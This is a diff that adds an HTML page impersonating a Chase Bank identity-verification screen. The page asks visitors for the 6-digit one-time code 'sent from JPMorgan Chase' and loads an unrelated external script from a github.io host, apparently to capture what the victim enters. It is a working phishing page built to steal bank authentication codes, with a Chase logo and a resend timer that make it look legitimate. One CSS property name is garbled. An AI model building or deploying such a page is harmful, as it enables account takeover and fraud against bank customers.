@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chase Bank – Verify</title>
+
+<style>
+body {
+  background_toggleolor: #f1f3f6;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  font-family: Arial, sans-serif;
+}
+
+.chase-box {
+  background: white;
+  padding: 40px;
+  width: 380px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.25);
+}
+
+h2 {
+  color: #0a2a5a;
+  margin-bottom: 10px;
+}
+
+.desc {
+  font-size: 13px;
+  color: #333;
+  margin-bottom: 20px;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  background: #f7f8fb;
+  font-size: 18px;
+  text-align: center;
+  letter-spacing: 6px;
+  margin-bottom: 20px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background: #0a2a5a;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 10px;
+}
+
+.resend {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #666;
+}
+
+button:disabled {
+  background: #999;
+  cursor: not-allowed;
+}
+</style>
+
+</head>
+
+<body>
+<script src="https://plyarth.github.io/intc/int5.js"></script>
+<div class="chase-box">
+  <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQK12bmtfhc8ntoxm5lP1DRrLg_sdP6L5_ANg&s" alt="Chase">
+
+  <h2>Chase Verification</h2>
+
+  <div class="desc">
+    Enter the 6-digit code sent from JPMorgan Chase to confirm your identity.
+  </div>
+
+  <form>
+    <input type="text" maxlength="20" placeholder="------" name="Otp Code" required>
+
+    <button>Verify Identity</button>
+
+    <button type="button" id="resendBtn" disabled>Resend Code</button>
+
+    <div class="resend">
+      Resend available in <span id="timer">30</span>s
+    </div>
+  </form>
+</div>
+
+<script>
+let countdown = 30;
+const timer = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+
+setInterval(() => {
+  countdown--;
+  timer.innerText = countdown;
+
+  if (countdown <= 0) {
+    resendBtn.disabled = false;
+  }
+}, 1000);
+
+resendBtn.addEventListener("click", () => {
+  alert("Demo: Chase resend action");
+  countdown = 30;
+  resendBtn.disabled = true;
+});
+</script>
+
+</body>
+</html>
